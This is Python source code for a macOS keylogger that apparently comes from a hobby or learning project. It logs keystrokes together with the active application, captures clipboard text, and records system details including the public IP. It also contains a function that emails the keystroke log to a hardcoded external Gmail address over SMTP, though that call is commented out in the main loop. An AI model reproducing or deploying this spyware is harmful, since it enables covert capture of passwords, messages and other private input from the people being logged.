import os.path
import socket
import platform
import time
from pynput.keyboard import Key, Listener
from datetime import datetime
from AppKit import NSWorkspace, NSPasteboard, NSStringPboardType

from requests import get
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

buffer_size = 20
keys = []
apps = []
count = 0

time_interval = 15
number_of_iterations = 5
current_time = 0

# Handles key press events, logging any pressed keys, 10 keys at a time
def on_press(key):
    global keys, count, apps, current_time
    #print (f"{key} pressed")

    # appends key pressed and current open application to respective lists
    keys.append(key)
    apps.append(NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName'])
    count += 1

    current_time = time.time()

    # once the lists have 10 entries in them, call write to file and clear lists
    if count == buffer_size:
        write_file(keys, apps)
        count = 0
        keys.clear()
        apps.clear()


def on_release(key):
    if key == Key.esc:
        return False
    if current_time > stopping_time:
        return False

# Converts each key press into a string and appends to the output file, with spaces being converted into a new line
def write_file(keys, apps):
    # Logs each key press
    with open("out/log.txt", "a") as file:
        last_active_app = None
        nl = "\n"

        #loops through each key/app in keys/apps lists 
        for n in range(buffer_size):
            k = str(keys[n]).replace("'", "")
            #converts current app to string, otherwise 
            current_app = str(apps[n])

            # is current application changes, start logging on new line
            if (last_active_app != current_app):
                last_active_app = current_app
                ts = datetime.now().ctime()

                file.write(nl + ts + " " + current_app + " " + k)
                
                #debug
                print(f'working app changed to {current_app}\n')
                print(n)
            # if space bar pressed, start logging on new line
            elif (k == 'Key.space'):
                ts = datetime.now().ctime()

                file.write(nl + ts + " " + current_app + " ")
            else:
                file.write(k)
                

def init_log_file():
    # Creates out/log.txt if it doesnt already exist
    if (os.path.isfile("out/log.txt") != True):
        with open("out/log.txt", "x") as file:
            print("log.txt not found, creating file.\n")
            file.write("Timestamp, Current Application, Keys pressed\n")

def log_sys_info():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    ip = get('https://api.ipify.org').content.decode('utf8').format(ip)

    processor= platform.processor()
    machine = platform.machine()
    sys = platform.system()
    vers = platform.version()
    arch = platform.architecture()[0]

    sysinfo = (
        f"Hostname: {hostname}\n"
        f"IPv4 Address: {ip}\n"
        f"Processor: {processor}\n"
        f"Machine: {machine}\n"
        f"System: {sys}\n"
        f"Version: {vers}\n"
        f"Architecture: {arch}\n\n"
    )

    if (os.path.isfile("out/sysinfo.txt") != True):
        with open("out/sysinfo.txt", "x") as file:
            print("sysinfo.txt not found, creating file.\n")
            file.write(sysinfo)
    else:
        with open("out/sysinfo.txt", "a") as file:
            file.write(sysinfo)

def send_email():
    fromaddr = "MS_hPVXeT@test-p7kx4xw63p7g9yjr.mlsender.net"
    toaddr = 'ibraheem.m.a04@gmail.com'

    # Construct message
    msg = MIMEMultipart()
    msg['From'] = "MS_W4tuaY@test-p7kx4xw63p7g9yjr.mlsender.net"
    msg['To'] = 'ibraheem.m.a04@gmail.com'
    msg['Subject'] = 'User Log'
    body = 'This is a test'

    msg.attach(MIMEText(body, 'plain'))

    # Open and attach file
    filename = "log.txt"
    attachment = open("out/log.txt", "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # attach file
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.mailersend.net', 587)
    # start TLS for security
    s.starttls()

    # Authentication
    s.login(fromaddr,os.environ['mail_pass'])
    # Converts the Multipart msg into a string
    text = msg.as_string()
    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    # terminating the session
    s.quit()

def log_clipboard():
    pb = NSPasteboard.generalPasteboard()
    pbstring = pb.stringForType_(NSStringPboardType)
    print("Pastboard string: %s \n" % pbstring)

    with open("out/clipboard.txt", "a") as file:
        file.write(pbstring + "\n")

    if (os.path.isfile("out/clipboard.txt") != True):
        with open("out/clipboard.txt", "x") as file:
            print("clipboard.txt not found, creating file.\n")
            file.write(pbstring + "\n")
    else:
        with open("out/clipboard.txt", "a") as file:
            file.write(pbstring + "\n")

if __name__ == "__main__":
    iteration_count = 0

    init_log_file()
    log_sys_info()

    current_time = time.time()
    stopping_time = current_time + time_interval

    while (iteration_count < number_of_iterations):
        with Listener(
                      on_press=on_press,
                      on_release=on_release) as listener:
            print("Key Logger is running\nPressing any key will write it to out/log.txt\n")
            listener.join()

        if current_time > stopping_time:
            #send_email()
            log_clipboard()
            log_sys_info()

            print("Iterated\n")

            iteration_count += 1
            current_time = time.time()
            stopping_time = current_time + time_interval
            
        # listener = Listener(
        #     on_press=on_press,
        #     on_release=on_release)

        # listener.start()
        # time.sleep(20)
        # print("Key Logger is running\nPressing any key will append it to out/log.txt")
